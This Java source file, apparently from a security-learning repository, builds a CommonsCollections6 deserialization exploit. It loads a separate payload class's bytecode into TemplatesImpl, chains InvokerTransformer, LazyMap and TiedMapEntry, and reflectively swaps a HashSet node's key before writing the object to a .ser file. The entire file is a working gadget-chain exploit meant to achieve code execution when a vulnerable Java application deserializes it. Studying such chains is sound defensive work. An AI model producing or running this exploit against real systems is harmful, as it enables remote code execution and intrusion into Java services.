package CommonsCollections6;

import CommonsCollections4.payload;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.lang.reflect.Method;
import java.lang.Class;
import java.lang.Runtime;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class exp2 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException, IOException, CannotCompileException, NotFoundException {
        //封装TemplateImpl类
        TemplatesImpl tmp = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload.class));
        CtClass pay_class = pool.get(payload.class.getName());
        byte[] payCode = pay_class.toBytecode();
        Class clazz;
        clazz =Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        //存储payload字节码
        Field byteCode = clazz.getDeclaredField("_bytecodes");
        byteCode.setAccessible(true);
        byteCode.set(tmp,new byte[][]{payCode});
        Field name  = clazz.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmp,"tr1ple");

        InvokerTransformer trans = new InvokerTransformer("newTransformer",new Class[0],new Object[0]);

        HashMap innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, trans);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, tmp);

        innerMap.clear();


        //构造外部入口链
        HashSet newSet = new HashSet(1);
        newSet.add("tr1ple");

        Field innerSetMap  = HashSet.class.getDeclaredField("map");
        innerSetMap.setAccessible(true);
        //修改hashset内部的hashmap存储
        HashMap setMap = (HashMap)innerSetMap.get(newSet);
        Field table = HashMap.class.getDeclaredField("table");
        table.setAccessible(true);
        //拿到存储的数据
        Object[] obj = (Object[])table.get(setMap);
        Object node  = obj[0];

        System.out.println(node.getClass().getName());
        Method[] methods  = node.getClass().getMethods();


        for(int i=0;i<methods.length;i++){
            System.out.println(methods[i].getName());
        }


        //拿到此时存到hashset中的node节点，key为要修改的点，这里需要修改它为真正的payload，即Tiedmapentry
        System.out.println(node.toString());

        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node,entry);

        //hashset的hashmap中的node节点修改完值以后放进hashset
        Field finalMap = newSet.getClass().getDeclaredField("map");
        finalMap.setAccessible(true);
        finalMap.set(newSet,setMap);

        //序列化
        File file;
        file = new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commonscollections6-2.ser");
        ObjectOutputStream objOut = new ObjectOutputStream(new FileOutputStream(file));
        objOut.writeObject(newSet);

    }
}
